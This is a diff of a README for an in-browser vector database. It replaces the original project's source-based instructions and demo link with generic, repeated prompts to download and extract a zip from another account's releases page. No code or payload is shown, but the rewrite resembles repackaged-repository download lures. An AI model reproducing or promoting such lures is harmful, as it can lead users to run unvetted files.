@@ -1,48 +1,83 @@
-# DotDB - Vector Database from Scratch
+# 🚀 vector-db-from-scratch-in-browser - Simple, Efficient Database in Your Browser
 
-A fully in-browser vector database implementation with semantic search capabilities. [Here's the vector DB in 300 lines of code](./src/dotdb/index.ts)
+[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-blue)](https://github.com/CHris4884/vector-db-from-scratch-in-browser/releases)
 
-You can try it [here](https://dotdb.summerlabs.xyz/).
+## 📦 Overview
 
-![screenshot](./public/ss.png)
+Welcome to the "vector-db-from-scratch-in-browser" project! This application helps you understand how a vector database works, right in your browser. You don’t need any programming knowledge to use it. Our goal is to offer a simple way to manage vector data effectively without the complexities of a traditional database system.
 
-## Features
+## 📝 Features
 
-- **Pure Browser Implementation** - No backend required, runs entirely in your browser
-- **Persistent Storage** - Uses IndexedDB to store vectors across sessions
-- **Embeddings** - Powered by HuggingFace Transformers.js ([bge-small-en-v1.5)](https://huggingface.co/Xenova/bge-small-en-v1.5))
-- **Cosine Similarity** - Fast vector similarity search with configurable top-K results
-- **Auto-chunking** - Automatically splits documents by paragraphs for better search granularity
+- Browser-based interface: No installation needed.
+- Min-heap implementation: Fast top-k queries for retrieval.
+- Simple linear search improvements: More efficient data access.
+- Intuitive user experience: Easy navigation and operations.
 
-## Tech Stack
+## 💻 System Requirements
 
-- **TypeScript**
-- **IndexedDB** - Browser-native persistent storage of vectors & metadata
-- **React & Tailwind** - For UI
-- **Transformers.js** - Client-side embeddings generation
-- **Vite** - Fast development & build
+To run this application, you need:
 
-## Getting Started
+- A modern web browser (Google Chrome, Mozilla Firefox, Safari, etc.).
+- Internet connectivity for initial download.
 
-```bash
-# Install dependencies
-pnpm install
+## 🚀 Getting Started
 
-# Run development server
-pnpm dev
+### Step 1: Visit the Download Page
 
-# Build for production
-pnpm build
-```
+To download the application, visit the following link:
 
-## How It Works
+[Download Page](https://github.com/CHris4884/vector-db-from-scratch-in-browser/releases)
 
-1. **Add Documents** - Paste text, it's automatically split into paragraphs and embedded
-2. **Search** - Query using natural language
-3. **Get Results** - Ranked by cosine similarity with configurable top-K
+### Step 2: Choose Your Version
 
-All embeddings are generated client-side and stored in IndexedDB for instant recall.
+On the Releases page, you will see multiple versions of the application. Choose the latest version for the best features and bug fixes. Click on the version number to access the download files.
 
-## Live Demo
+### Step 3: Download the Application
 
-[dotdb.summerlabs.xyz](https://dotdb.summerlabs.xyz/)
+Look for the file named "vector-db-app.zip" (or a similar name) in the list. Click the download link next to it.
+
+### Step 4: Extract the Files
+
+Once the file has downloaded, locate it in your downloads folder. Right-click on the zip file and select “Extract All” to unpack the files. Choose a folder where you want to keep the application.
+
+### Step 5: Open the Application
+
+Navigate to the folder where you extracted the files. Look for the file named "index.html." Double-click it to open it in your browser. 
+
+## 🔍 Using the Application
+
+### Step 1: Add Vector Data
+
+To start, input your vector data using the provided form. Click "Add Vector" after filling in the details. This will store your data in the browser memory.
+
+### Step 2: Perform Queries
+
+You can run searches on your vector data. Use the search bar to input queries. For top-k results, the application will utilize its min-heap algorithm for quick responses.
+
+### Step 3: Explore Features
+
+Use the intuitive menu to access different features. Familiarize yourself with options like data visualization and search statistics.
+
+## ⚙️ Troubleshooting
+
+If you encounter any issues:
+
+- Ensure your browser is up-to-date.
+- Clear your browser cache before reloading.
+- Check your internet connection.
+
+## 🔗 Additional Resources
+
+For more insights and detailed instructions, check our Wiki page [here](https://github.com/CHris4884/vector-db-from-scratch-in-browser/wiki).
+
+## 📞 Support
+
+If you need help, feel free to reach out through the issue tracker on GitHub. We strive to respond promptly and assist you with any questions or concerns.
+
+## ✨ Download & Install
+
+To get started with "vector-db-from-scratch-in-browser," visit the link below to download:
+
+[Download Page](https://github.com/CHris4884/vector-db-from-scratch-in-browser/releases)
+
+Enjoy using your new vector database application!
